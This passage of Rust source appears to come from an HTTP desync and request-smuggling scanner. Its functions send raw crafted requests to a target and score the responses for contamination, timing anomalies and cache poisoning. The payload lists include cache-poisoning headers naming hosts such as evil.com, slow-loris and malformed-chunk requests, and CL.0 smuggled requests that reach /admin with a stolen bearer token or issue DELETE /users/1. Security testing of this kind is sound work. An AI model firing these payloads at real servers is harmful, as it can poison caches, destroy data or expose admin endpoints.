                        }
                    }

                    if !signals.is_empty() || severity != DesyncSeverity::Low {
                        results.push(DesyncResult {
                            url: url.to_string(),
                            test_type: DesyncType::HTTP2Downgrade,
                            severity,
                            signals,
                            request_fingerprint: self
                                .calculate_request_fingerprint(&h1_with_marker),
                            response_status: h1_response.status,
                            contamination_marker: Some(marker),
                            timing_ms,
                            via_header: h1_response.headers.get("via").map(|v| v.to_string()),
                            alt_svc: h1_response.headers.get("alt-svc").map(|v| v.to_string()),
                            evidence: DesyncEvidence {
                                raw_request: h1_with_marker.clone(),
                                raw_response: h1_response.body.clone(),
                                connection_reused: false,
                                server_header: h1_response
                                    .headers
                                    .get("server")
                                    .map(|v| v.to_string()),
                                response_headers: h1_response.headers.clone(),
                                body_snippet: Some(
                                    h1_response.body[..h1_response.body.len().min(500)].to_string(),
                                ),
                                timing_data: TimingData {
                                    baseline_ms: 500,
                                    actual_ms: timing_ms,
                                    samples: vec![timing_ms],
                                    anomaly_detected: protocol_downgrade_detected
                                        || status_discrepancy,
                                },
                                connection_fingerprint: Some(format!(
                                    "cross_protocol_{}",
                                    pattern_name
                                )),
                                parser_behavior: Some(ParserBehavior {
                                    accepts_duplicate_headers: pattern_name
                                        .contains("double_content"),
                                    header_case_sensitivity: false,
                                    chunk_extension_handling: "unknown".to_string(),
                                    te_cl_precedence: if pattern_name.contains("H2.CL") {
                                        "cl_first".to_string()
                                    } else if pattern_name.contains("H2.TE") {
                                        "te_first".to_string()
                                    } else {
                                        "protocol_dependent".to_string()
                                    },
                                    connection_header_behavior: if protocol_downgrade_detected {
                                        "forced_close".to_string()
                                    } else {
                                        "unknown".to_string()
                                    },
                                }),
                                differential_responses: vec![DifferentialResponse {
                                    test_name: format!("cross_protocol_{}", pattern_name),
                                    response_a: format!(
                                        "H2 Status: {}, Length: {}",
                                        h2_response.status,
                                        h2_response.body.len()
                                    ),
                                    response_b: format!(
                                        "H1 Status: {}, Length: {}",
                                        h1_response.status,
                                        h1_response.body.len()
                                    ),
                                    difference_detected: status_discrepancy || content_discrepancy,
                                    difference_type: "cross_protocol_parsing_difference"
                                        .to_string(),
                                }],
                                cache_indicators: Vec::new(),
                            },
                        });
                    }
                }
                Err(_e) => {
                    results.push(DesyncResult {
                        url: url.to_string(),
                        test_type: DesyncType::HTTP2Downgrade,
                        severity: DesyncSeverity::Medium,
                        signals: vec![DesyncSignal::TimingAnomaly {
                            delay_ms: 3000,
                            baseline_ms: 500,
                        }],
                        request_fingerprint: self.calculate_request_fingerprint(&h1_with_marker),
                        response_status: 0,
                        contamination_marker: Some(marker),
                        timing_ms: 3000,
                        via_header: None,
                        alt_svc: None,
                        evidence: DesyncEvidence {
                            raw_request: h1_with_marker.clone(),
                            raw_response: format!(
                                "TIMEOUT: Cross-protocol test {} failed",
                                pattern_name
                            ),
                            connection_reused: false,
                            server_header: None,
                            response_headers: HashMap::new(),
                            body_snippet: None,
                            timing_data: TimingData {
                                baseline_ms: 500,
                                actual_ms: 3000,
                                samples: vec![3000],
                                anomaly_detected: true,
                            },
                            connection_fingerprint: Some(format!(
                                "cross_protocol_timeout_{}",
                                pattern_name
                            )),
                            parser_behavior: None,
                            differential_responses: Vec::new(),
                            cache_indicators: Vec::new(),
                        },
                    });
                }
            }

            tokio::time::sleep(Duration::from_millis(200)).await;
        }

        Ok(results)
    }

    async fn test_cache_poisoning(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();

        let cache_keys = vec![
            ("Host header", "evil.com"),
            ("X-Forwarded-Host", "attacker.com"),
            ("X-Host", "malicious.net"),
            ("X-Original-URL", "/admin"),
            ("X-Rewrite-URL", "/sensitive"),
        ];

        for (key_type, poison_value) in cache_keys {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let cache_key = format!("{}-cache-{}", self.config.canary_prefix, marker);

            let poisoning_request = format!(
                "GET /{} HTTP/1.1\r\nHost: {}\r\nX-Cache-Key: {}\r\n{}: {}\r\n\r\n",
                cache_key,
                self.extract_host(url)?,
                cache_key,
                key_type.replace(" header", ""),
                poison_value
            );

            match self.send_raw_request(url, &poisoning_request).await {
                Ok(poison_response) => {
                    tokio::time::sleep(Duration::from_millis(200)).await;

                    let verification_request = format!(
                        "GET /{} HTTP/1.1\r\nHost: {}\r\nX-Cache-Key: {}\r\n\r\n",
                        cache_key,
                        self.extract_host(url)?,
                        cache_key
                    );

                    match self.send_raw_request(url, &verification_request).await {
                        Ok(verify_response) => {
                            let timing_ms = start_time.elapsed().as_millis() as u64;
                            let mut signals = Vec::new();
                            let mut severity = DesyncSeverity::Low;

                            if verify_response.body.contains(poison_value)
                                || verify_response.raw_response.contains(poison_value)
                            {
                                signals.push(DesyncSignal::CacheContamination {
                                    cache_key: cache_key.clone(),
                                    poisoned_value: poison_value.to_string(),
                                });
                                severity = DesyncSeverity::Critical;
                            }

                            let cache_indicators = vec![
                                "X-Cache",
                                "CF-Cache-Status",
                                "X-Served-By",
                                "X-Cache-Hits",
                                "Age",
                            ];

                            let found_indicators: Vec<String> = cache_indicators
                                .iter()
                                .filter(|&indicator| {
                                    verify_response
                                        .headers
                                        .contains_key(&indicator.to_lowercase())
                                })
                                .map(|&s| s.to_string())
                                .collect();

                            results.push(DesyncResult {
                                url: url.to_string(),
                                test_type: DesyncType::CachePoisoning,
                                severity,
                                signals,
                                request_fingerprint: self
                                    .calculate_request_fingerprint(&poisoning_request),
                                response_status: verify_response.status,
                                contamination_marker: Some(marker.clone()),
                                timing_ms,
                                via_header: verify_response
                                    .headers
                                    .get("via")
                                    .map(|v| v.to_string()),
                                alt_svc: verify_response
                                    .headers
                                    .get("alt-svc")
                                    .map(|v| v.to_string()),
                                evidence: DesyncEvidence {
                                    raw_request: poisoning_request,
                                    raw_response: verify_response.body.clone(),
                                    connection_reused: false,
                                    server_header: verify_response
                                        .headers
                                        .get("server")
                                        .map(|v| v.to_string()),
                                    response_headers: verify_response.headers.clone(),
                                    body_snippet: Some(
                                        verify_response.body[..verify_response.body.len().min(500)]
                                            .to_string(),
                                    ),
                                    timing_data: TimingData {
                                        baseline_ms: 0,
                                        actual_ms: timing_ms,
                                        samples: vec![timing_ms],
                                        anomaly_detected: false,
                                    },
                                    connection_fingerprint: Some(format!(
                                        "cache_poisoning_{}",
                                        key_type
                                    )),
                                    parser_behavior: None,
                                    differential_responses: vec![DifferentialResponse {
                                        test_name: "cache_poisoning".to_string(),
                                        response_a: format!(
                                            "Poison: {}",
                                            &poison_response.body
                                                [..poison_response.body.len().min(100)]
                                        ),
                                        response_b: format!(
                                            "Verify: {}",
                                            &verify_response.body
                                                [..verify_response.body.len().min(100)]
                                        ),
                                        difference_detected: poison_response.body
                                            != verify_response.body,
                                        difference_type: "cache_behavior".to_string(),
                                    }],
                                    cache_indicators: found_indicators,
                                },
                            });
                        }
                        Err(e) => warn!("Cache verification request failed: {}", e),
                    }
                }
                Err(e) => warn!("Cache poisoning request for '{}' failed: {}", key_type, e),
            }

            tokio::time::sleep(Duration::from_millis(200)).await;
        }

        Ok(results)
    }

    async fn establish_timing_baseline(
        &self,
        url: &str,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        let mut baseline_samples = Vec::new();

        for _ in 0..self.config.timing_samples {
            let start_time = Instant::now();
            let simple_request = format!(
                "GET / HTTP/1.1\r\nHost: {}\r\n\r\n",
                self.extract_host(url)?
            );

            match self.send_raw_request(url, &simple_request).await {
                Ok(_) => {
                    baseline_samples.push(start_time.elapsed().as_millis() as u64);
                }
                Err(e) => warn!("Baseline timing sample failed: {}", e),
            }

            tokio::time::sleep(Duration::from_millis(100)).await;
        }

        if !baseline_samples.is_empty() {
            let baseline_median = Self::calculate_median(&mut baseline_samples.clone());
            let mut timings = self.baseline_timings.lock().await;
            timings.put(url.to_string(), baseline_median);
            debug!(
                "Established timing baseline for {}: {}ms (median, samples: {:?})",
                url, baseline_median, baseline_samples
            );
        }

        Ok(())
    }

    async fn perform_timing_analysis(
        &self,
        url: &str,
        _existing_results: &[DesyncResult],
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();

        let baseline = {
            let mut timings = self.baseline_timings.lock().await;
            timings.get(url).copied().unwrap_or(1000)
        };

        let timing_payloads = vec![
            (
                "Slow loris",
                format!(
                    "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 1000000\r\n\r\n",
                    self.extract_host(url)?
                ),
            ),
            (
                "Keep-alive exhaustion",
                format!(
                    "GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n",
                    self.extract_host(url)?
                ),
            ),
            (
                "Large headers",
                format!(
                    "GET / HTTP/1.1\r\nHost: {}\r\nX-Large-Header: {}\r\n\r\n",
                    self.extract_host(url)?,
                    "A".repeat(8192)
                ),
            ),
            (
                "Malformed chunking",
                format!(
                    "POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\n\r\nFFFFFFFF\r\n",
                    self.extract_host(url)?
                ),
            ),
        ];

        for (test_name, payload) in timing_payloads {
            let mut timing_samples = Vec::new();

            for _ in 0..self.config.timing_samples {
                let start_time = Instant::now();

                match tokio::time::timeout(
                    Duration::from_secs(10),
                    self.send_raw_request(url, &payload),
                )
                .await
                {
                    Ok(Ok(_response)) => {
                        timing_samples.push(start_time.elapsed().as_millis() as u64);
                    }
                    Ok(Err(_)) | Err(_) => {
                        timing_samples.push(10000); // Timeout or error
                    }
                }

                tokio::time::sleep(Duration::from_millis(200)).await;
            }

            if !timing_samples.is_empty() {
                let median_timing = Self::calculate_median(&mut timing_samples.clone());
                let percentile_95 = Self::calculate_percentile(&mut timing_samples.clone(), 95);
                let outlier_detected = Self::detect_timing_outlier(
                    &timing_samples,
                    baseline,
                    self.config.timing_threshold_ms,
                );
                let timing_anomaly =
                    outlier_detected || median_timing > baseline + self.config.timing_threshold_ms;

                if timing_anomaly {
                    let marker = self.generate_marker();

                    results.push(DesyncResult {
                        url: url.to_string(),
                        test_type: DesyncType::TimingAnomaly,
                        severity: if percentile_95 > baseline * 3 {
                            DesyncSeverity::High
                        } else {
                            DesyncSeverity::Medium
                        },
                        signals: vec![DesyncSignal::TimingAnomaly {
                            delay_ms: median_timing,
                            baseline_ms: baseline,
                        }],
                        request_fingerprint: self.calculate_request_fingerprint(&payload),
                        response_status: 0,
                        contamination_marker: Some(marker.clone()),
                        timing_ms: median_timing,
                        via_header: None,
                        alt_svc: None,
                        evidence: DesyncEvidence {
                            raw_request: payload,
                            raw_response: "Timing analysis result".to_string(),
                            connection_reused: false,
                            server_header: None,
                            response_headers: HashMap::new(),
                            body_snippet: None,
                            timing_data: TimingData {
                                baseline_ms: baseline,
                                actual_ms: median_timing,
                                samples: timing_samples,
                                anomaly_detected: timing_anomaly,
                            },
                            connection_fingerprint: Some(format!("timing_{}", test_name)),
                            parser_behavior: None,
                            differential_responses: Vec::new(),
                            cache_indicators: Vec::new(),
                        },
                    });
                }
            }
        }

        Ok(results)
    }

    async fn test_double_desync(
        &self,
        url: &str,
    ) -> Result<Vec<DesyncResult>, Box<dyn std::error::Error + Send + Sync>> {
        let mut results = Vec::new();
        let host = self.extract_host(url)?;

        let double_desync_patterns = vec![
            ("CL.0_classic", format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\nPOST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 7\r\n\r\nabc=def",
                host, host
            )),
            ("0.CL_reverse", format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 7\r\n\r\nabc=defPOST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\n",
                host, host
            )),
            ("CL.0_weaponized", format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nConnection: keep-alive\r\n\r\nGET /admin HTTP/1.1\r\nHost: {}\r\nAuthorization: Bearer stolen\r\nContent-Length: 0\r\n\r\n",
                host, host
            )),
            ("double_CL_0_confusion", format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\nContent-Length: 44\r\n\r\nGET /sensitive HTTP/1.1\r\nHost: {}\r\n\r\n",
                host, host
            )),
            ("CL.0_with_expect", format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nExpect: 100-continue\r\nContent-Length: 0\r\n\r\nGET /api/admin HTTP/1.1\r\nHost: {}\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Length: 0\r\n\r\n",
                host, host
            )),
            ("early_response_gadget", format!(
                "GET /redirect HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\nPOST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 23\r\n\r\nmalicious=payload&x=y",
                host, host
            )),
            ("CL.0_pipeline_abuse", format!(
                "GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\nContent-Length: 0\r\n\r\nPOST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\n",
                host, host
            )),
            ("TE_CL.0_hybrid", format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\n\r\nGET /evil HTTP/1.1\r\nHost: {}\r\n\r\n",
                host, host
            )),
            ("0.CL_timing_oracle", format!(
                "POST /slow HTTP/1.1\r\nHost: {}\r\nContent-Length: 5\r\n\r\ndelay\r\nGET / HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\n",
                host, host
            )),
            ("CL.0_method_override", format!(
                "POST / HTTP/1.1\r\nHost: {}\r\nX-HTTP-Method-Override: DELETE\r\nContent-Length: 0\r\n\r\nDELETE /users/1 HTTP/1.1\r\nHost: {}\r\nContent-Length: 0\r\n\r\n",
                host, host
            )),
        ];

        for (pattern_name, base_pattern) in &double_desync_patterns {
            let start_time = Instant::now();
            let marker = self.generate_marker();

            let raw_request = format!(
                "{}\r\nGET /{}-{} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                base_pattern, self.config.canary_prefix, marker, host
            );

            match self
                .send_raw_request_with_timeout(url, &raw_request, Duration::from_millis(5000))
                .await
            {
                Ok(response) => {
                    let timing_ms = start_time.elapsed().as_millis() as u64;
                    let mut signals = Vec::new();
                    let mut severity = DesyncSeverity::Low;

                    if self.check_contamination(&response, &marker) {
                        signals.push(DesyncSignal::ResponseContamination {
                            marker: marker.clone(),
                        });
                        severity = DesyncSeverity::Critical;
                    }

                    if timing_ms > 3000 {
                        signals.push(DesyncSignal::TimingAnomaly {
                            delay_ms: timing_ms,
                            baseline_ms: 500,
                        });
                        if severity == DesyncSeverity::Low {
                            severity = DesyncSeverity::Medium;
                        }
                    }

                    if response.status == 400 && response.body.contains("Bad Request") {
                        signals.push(DesyncSignal::SplitError {
                            status: response.status,
                            headers: response.headers.keys().cloned().collect(),
                        });
                        if severity == DesyncSeverity::Low {
                            severity = DesyncSeverity::High;
                        }
                    }

                    if response.status == 302 || response.status == 301 {
                        if let Some(location) = response.headers.get("location") {
                            if location != "/" {
                                signals.push(DesyncSignal::ProxyBehaviorDiscrepancy {
                                    proxy_response: format!("Redirect to {}", location),
                                    direct_response: "Normal response expected".to_string(),
                                });
                                severity = DesyncSeverity::High;
                            }
                        }
                    }

                    let differential_responses =
                        self.perform_differential_analysis(url, &raw_request).await;

                    let has_early_response = response.body.len() < 50 && timing_ms < 200;
                    if has_early_response && pattern_name.contains("early_response") {
                        signals.push(DesyncSignal::UnexpectedResponseLength {
                            expected: 200,
                            actual: response.body.len(),
                        });
                        severity = DesyncSeverity::High;
                    }

                    if !signals.is_empty() || severity != DesyncSeverity::Low {
                        results.push(DesyncResult {
                            url: url.to_string(),
                            test_type: DesyncType::DoubleDesync,
                            severity,
                            signals,
                            request_fingerprint: self.calculate_request_fingerprint(&raw_request),
                            response_status: response.status,
                            contamination_marker: Some(marker),
                            timing_ms,
                            via_header: response.headers.get("via").map(|v| v.to_string()),
                            alt_svc: response.headers.get("alt-svc").map(|v| v.to_string()),
                            evidence: DesyncEvidence {
                                raw_request: raw_request.clone(),
                                raw_response: response.body.clone(),
                                connection_reused: false,
                                server_header: response
                                    .headers
                                    .get("server")
                                    .map(|v| v.to_string()),
                                response_headers: response.headers.clone(),
                                body_snippet: Some(
                                    response.body[..response.body.len().min(500)].to_string(),
                                ),
                                timing_data: TimingData {
                                    baseline_ms: 500,
                                    actual_ms: timing_ms,
                                    samples: vec![timing_ms],
                                    anomaly_detected: timing_ms > 3000 || has_early_response,
                                },
                                connection_fingerprint: Some(format!(
                                    "double_desync_{}",
                                    pattern_name
                                )),
                                parser_behavior: Some(ParserBehavior {
                                    accepts_duplicate_headers: response.headers.len() > 10,
                                    header_case_sensitivity: false,
                                    chunk_extension_handling: "unknown".to_string(),
                                    te_cl_precedence: if pattern_name.contains("TE_CL") {
                                        "te_first".to_string()
                                    } else {
                                        "cl_first".to_string()
                                    },
                                    connection_header_behavior: if response
                                        .headers
                                        .contains_key("connection")
                                    {
                                        "honored".to_string()
                                    } else {
                                        "ignored".to_string()
                                    },
                                }),
                                differential_responses,
                                cache_indicators: Vec::new(),
                            },
                        });
                    }
                }
                Err(e) => {
                    if e.to_string().contains("timeout") {
                        results.push(DesyncResult {
                            url: url.to_string(),
                            test_type: DesyncType::DoubleDesync,
                            severity: DesyncSeverity::High,
                            signals: vec![DesyncSignal::TimingAnomaly {
                                delay_ms: 5000,
                                baseline_ms: 500,
                            }],
                            request_fingerprint: self.calculate_request_fingerprint(&raw_request),
                            response_status: 0,
                            contamination_marker: Some(marker),
                            timing_ms: 5000,
                            via_header: None,
                            alt_svc: None,
                            evidence: DesyncEvidence {
                                raw_request: raw_request.clone(),
                                raw_response: format!("TIMEOUT: {}", e),
                                connection_reused: false,
                                server_header: None,
                                response_headers: HashMap::new(),
                                body_snippet: None,
                                timing_data: TimingData {
                                    baseline_ms: 500,
                                    actual_ms: 5000,
                                    samples: vec![5000],
                                    anomaly_detected: true,
                                },
                                connection_fingerprint: Some(format!(
                                    "double_desync_timeout_{}",
                                    pattern_name
                                )),
                                parser_behavior: None,
                                differential_responses: Vec::new(),
                                cache_indicators: Vec::new(),
                            },
                        });
                    }
                }
            }

            tokio::time::sleep(Duration::from_millis(200)).await;
        }

        Ok(results)
    }

    fn calculate_median(samples: &mut [u64]) -> u64 {
        if samples.is_empty() {
            return 0;
        }
        samples.sort_unstable();
        let len = samples.len();
        if len % 2 == 0 {
            (samples[len / 2 - 1] + samples[len / 2]) / 2
        } else {
            samples[len / 2]
        }
    }

    fn calculate_percentile(samples: &mut [u64], percentile: u8) -> u64 {
        if samples.is_empty() {
            return 0;
        }
        samples.sort_unstable();
        let index = ((percentile as f64 / 100.0) * (samples.len() - 1) as f64).round() as usize;
        samples[index.min(samples.len() - 1)]
    }

    fn detect_timing_outlier(samples: &[u64], baseline: u64, threshold_ms: u64) -> bool {
        if samples.len() < 3 {
            return false;
        }

        let mean = samples.iter().sum::<u64>() / samples.len() as u64;
        let variance = samples
            .iter()
            .map(|x| {
                let diff = (*x).abs_diff(mean);
                diff * diff
            })
            .sum::<u64>()
            / samples.len() as u64;

        let std_dev = (variance as f64).sqrt() as u64;
        let z_threshold = 2.0;

        for &sample in samples {
            let z_score = if sample > mean {
                (sample - mean) as f64 / std_dev.max(1) as f64
            } else {
                (mean - sample) as f64 / std_dev.max(1) as f64
            };

            if z_score > z_threshold && sample > baseline + threshold_ms {
                return true;
            }
        }

        false
    }

    fn validate_config(
        config: &mut DesyncConfig,
    ) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
        if config.canary_prefix.is_empty() || config.canary_prefix.len() > 16 {
            return Err("Invalid canary prefix length".into());
        }

        if !config
            .canary_prefix
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
        {
            return Err("Canary prefix contains invalid characters".into());
        }

        if config.max_connections_per_host > 10 {
            config.max_connections_per_host = 10;
        }

        if config.timing_samples > 10 {
            config.timing_samples = 10;
        }

        if config.max_body_size > 65536 {
            config.max_body_size = 65536;
        }

        Ok(())
    }

    fn generate_marker(&self) -> String {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        format!("{:08x}", rng.gen::<u32>())
    }

    fn extract_host(&self, url: &str) -> Result<String, Box<dyn std::error::Error + Send + Sync>> {
        if url.is_empty() || url.len() > 2048 {
            return Err("Invalid URL length".into());
        }

        let parsed = url::Url::parse(url)?;
        let host = parsed.host_str().ok_or("No host in URL")?;

        if host.contains('\r') || host.contains('\n') || host.contains('\t') {
            return Err("Host contains dangerous characters".into());
        }

        if !host
            .chars()
            .all(|c| c.is_ascii_graphic() || c == '.' || c == '-')
        {
            return Err("Host contains invalid characters".into());
        }

        Ok(host.to_string())
    }

    async fn send_raw_request(
        &self,
        url: &str,
        raw_request: &str,
    ) -> Result<RawHttpResponse, Box<dyn std::error::Error + Send + Sync>> {
        let parsed_url = url::Url::parse(url)?;
        let host = parsed_url.host_str().ok_or("No host in URL")?;
        let use_tls = parsed_url.scheme() == "https";
        let port = parsed_url
            .port_or_known_default()
            .unwrap_or(if use_tls { 443 } else { 80 });

        if use_tls {
            self.send_raw_request_tls(host, port, raw_request).await
        } else {
            self.send_raw_request_tcp(host, port, raw_request).await
        }
    }

    async fn send_raw_request_tcp(
        &self,
        host: &str,
        port: u16,
        raw_request: &str,
    ) -> Result<RawHttpResponse, Box<dyn std::error::Error + Send + Sync>> {
        let connect_timeout = tokio::time::timeout(
            self.config.connect_timeout,
            TcpStream::connect(format!("{}:{}", host, port)),
        );

        let mut stream = match connect_timeout.await {
            Ok(Ok(stream)) => stream,
            Ok(Err(e)) => return Err(format!("Connection failed: {}", e).into()),
            Err(_) => return Err("Connection timeout".into()),
        };

        stream.write_all(raw_request.as_bytes()).await?;

        let mut response_buffer = Vec::new();

        let mut total_read = 0;
        let start_time = std::time::Instant::now();
        let max_read_time = Duration::from_millis(5000);
        let mut consecutive_empty_reads = 0;

        while start_time.elapsed() < max_read_time && total_read < 65536 {
            let mut chunk_buffer = [0u8; 4096];
            let read_result =
                tokio::time::timeout(Duration::from_millis(500), stream.read(&mut chunk_buffer))
                    .await;

            match read_result {
                Ok(Ok(0)) => {
                    consecutive_empty_reads += 1;
                    if consecutive_empty_reads >= 3 {
                        break; // Connection closed or no more data
                    }
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
                Ok(Ok(n)) => {
                    response_buffer.extend_from_slice(&chunk_buffer[..n]);
                    total_read += n;
                    consecutive_empty_reads = 0;

                    let response_str = String::from_utf8_lossy(&response_buffer);
                    if response_str.contains("\r\n\r\n") && response_str.len() > 50 {
                        break; // We have headers at least
                    }
                }
                Ok(Err(_)) => break, // Connection error
                Err(_) => continue,  // Timeout, try again
            }
        }

        let raw_response = String::from_utf8_lossy(&response_buffer).to_string();
        self.parse_http_response(&raw_response)
    }

    async fn send_raw_request_tls(
        &self,
        host: &str,
        port: u16,
        raw_request: &str,
    ) -> Result<RawHttpResponse, Box<dyn std::error::Error + Send + Sync>> {
        use std::sync::Arc;
        use tokio_rustls::{rustls, TlsConnector};

        let mut root_store = rustls::RootCertStore::empty();
        root_store.add_trust_anchors(webpki_roots::TLS_SERVER_ROOTS.iter().map(|ta| {
            rustls::OwnedTrustAnchor::from_subject_spki_name_constraints(
                ta.subject,
                ta.spki,
                ta.name_constraints,
            )
        }));

        let config = rustls::ClientConfig::builder()
            .with_safe_defaults()
            .with_root_certificates(root_store)
            .with_no_client_auth();

        let connector = TlsConnector::from(Arc::new(config));
        let domain = rustls::ServerName::try_from(host)?;

        let tcp_stream = tokio::time::timeout(
            self.config.connect_timeout,
            TcpStream::connect(format!("{}:{}", host, port)),
        )
        .await??;

        let mut tls_stream = connector.connect(domain, tcp_stream).await?;

        tls_stream.write_all(raw_request.as_bytes()).await?;

        let mut response_buffer = Vec::new();

        let mut total_read = 0;
        let start_time = std::time::Instant::now();
        let max_read_time = Duration::from_millis(5000);
        let mut consecutive_empty_reads = 0;

        while start_time.elapsed() < max_read_time && total_read < 65536 {
            let mut chunk_buffer = [0u8; 4096];
            let read_result = tokio::time::timeout(
                Duration::from_millis(500),
                tls_stream.read(&mut chunk_buffer),
            )
            .await;

            match read_result {
                Ok(Ok(0)) => {
                    consecutive_empty_reads += 1;
                    if consecutive_empty_reads >= 3 {
                        break; // Connection closed or no more data
                    }
                    tokio::time::sleep(Duration::from_millis(100)).await;
                }
                Ok(Ok(n)) => {
                    response_buffer.extend_from_slice(&chunk_buffer[..n]);
                    total_read += n;
                    consecutive_empty_reads = 0;

                    let response_str = String::from_utf8_lossy(&response_buffer);
                    if response_str.contains("\r\n\r\n") && response_str.len() > 50 {
                        break; // We have headers at least
                    }
                }
                Ok(Err(_)) => break, // Connection error
                Err(_) => continue,  // Timeout, try again
            }
        }

        let raw_response = String::from_utf8_lossy(&response_buffer).to_string();
        self.parse_http_response(&raw_response)
    }

    fn parse_http_response(
        &self,
        raw_response: &str,
    ) -> Result<RawHttpResponse, Box<dyn std::error::Error + Send + Sync>> {
        let mut lines = raw_response.lines();

        let status_line = lines.next().ok_or("No status line in response")?;
        let parts: Vec<&str> = status_line.split_whitespace().collect();

        if parts.len() < 3 {
            return Err("Invalid status line format".into());
        }

        let http_version = parts[0].to_string();
        let status: u16 = parts[1].parse()?;
        let status_text = parts[2..].join(" ");

        let mut headers = HashMap::new();
        let mut body_started = false;
        let mut body_lines = Vec::new();

        for line in lines {
            if !body_started {
                if line.is_empty() {
                    body_started = true;
                    continue;
                }

                if let Some(colon_pos) = line.find(':') {
                    let key = line[..colon_pos].trim().to_lowercase();
                    let value = line[colon_pos + 1..].trim().to_string();
                    headers.insert(key, value);
                }
            } else {
                body_lines.push(line);
            }
        }

        let body = body_lines.join("\n");

        Ok(RawHttpResponse {
            status,
            status_text,
            headers,
            body,
            raw_response: raw_response.to_string(),
            http_version,
        })
    }

    fn check_contamination(&self, response: &RawHttpResponse, marker: &str) -> bool {
        let full_marker = format!("{}-{}", self.config.canary_prefix, marker);

        if response.body.contains(&full_marker)
            || response.raw_response.contains(&full_marker)
            || response.headers.values().any(|v| v.contains(&full_marker))
        {
            return true;
        }

        CONTAMINATION_PATTERNS.is_match(&response.body)
            || CONTAMINATION_PATTERNS.is_match(&response.raw_response)
            || response
                .headers
                .values()
                .any(|v| CONTAMINATION_PATTERNS.is_match(v))
    }

    fn detect_cache_indicators(&self, response: &RawHttpResponse) -> Vec<String> {
        let mut indicators = Vec::new();

        for (key, value) in &response.headers {
            if CACHE_INDICATORS.is_match(key) || CACHE_INDICATORS.is_match(value) {
                indicators.push(format!("{}: {}", key, value));
            }
        }

        if CACHE_INDICATORS.is_match(&response.body) {
            indicators.push("Cache indicators in response body".to_string());
        }

        indicators
    }

    fn analyze_timing_patterns(&self, samples: &[u64], baseline: u64) -> bool {
        if samples.len() < 2 {
            return false;
        }

        let avg = samples.iter().sum::<u64>() / samples.len() as u64;
        let variance = samples
            .iter()
            .map(|&x| {
                let diff = x.abs_diff(avg);
                diff * diff
            })
            .sum::<u64>()
            / samples.len() as u64;

        avg > baseline + self.config.timing_threshold_ms || variance > baseline / 2
    }

    fn is_split_error(&self, response: &RawHttpResponse) -> bool {
        matches!(
            response.status,
            400 | 408 | 413 | 414 | 417 | 431 | 494 | 501
        ) || response
            .headers
            .get("connection")
            .map(|v| v.to_lowercase().contains("close"))
            .unwrap_or(false)
    }

    fn calculate_request_fingerprint(&self, request: &str) -> String {
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};

        let mut hasher = DefaultHasher::new();
        request.hash(&mut hasher);
        format!("{:016x}", hasher.finish())
    }

    async fn send_raw_request_with_timeout(
        &self,
        url: &str,
        raw_request: &str,
        timeout: Duration,
    ) -> Result<RawHttpResponse, Box<dyn std::error::Error + Send + Sync>> {
        match tokio::time::timeout(timeout, self.send_raw_request(url, raw_request)).await {
            Ok(result) => result,
            Err(_) => Err(format!("Request timeout after {}ms", timeout.as_millis()).into()),
        }
    }

    async fn perform_differential_analysis(
        &self,
        url: &str,
        raw_request: &str,
    ) -> Vec<DifferentialResponse> {
        let mut differential_responses = Vec::new();

        let host = match self.extract_host(url) {
            Ok(host) => host,
            Err(_) => return differential_responses,
        };

        let oracle_patterns = vec![
            ("proxy_hop_test", format!("GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\nVia: 1.1 test-proxy\r\n\r\n", host)),
            ("direct_hop_test", format!("GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", host)),
            ("cache_bypass_test", format!("GET /?cache_bypass=1 HTTP/1.1\r\nHost: {}\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n", host)),
            ("frontend_fingerprint", format!("GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Oracle-Frontend/1.0\r\nX-Forwarded-Proto: https\r\n\r\n", host)),
            ("backend_fingerprint", format!("GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: Oracle-Backend/1.0\r\nX-Real-IP: 127.0.0.1\r\n\r\n", host)),
            ("timing_oracle_slow", format!("GET /slow HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n", host)),
            ("timing_oracle_fast", format!("GET / HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n", host)),
        ];

        for (oracle_name, oracle_request) in &oracle_patterns {
            let start_time = Instant::now();

            match tokio::try_join!(
                self.send_raw_request_with_timeout(
                    url,
                    oracle_request,
                    Duration::from_millis(2000)
                ),
                self.send_raw_request_with_timeout(url, raw_request, Duration::from_millis(2000))
            ) {
                Ok((oracle_response, test_response)) => {
                    let timing_diff = start_time.elapsed().as_millis() as i64;

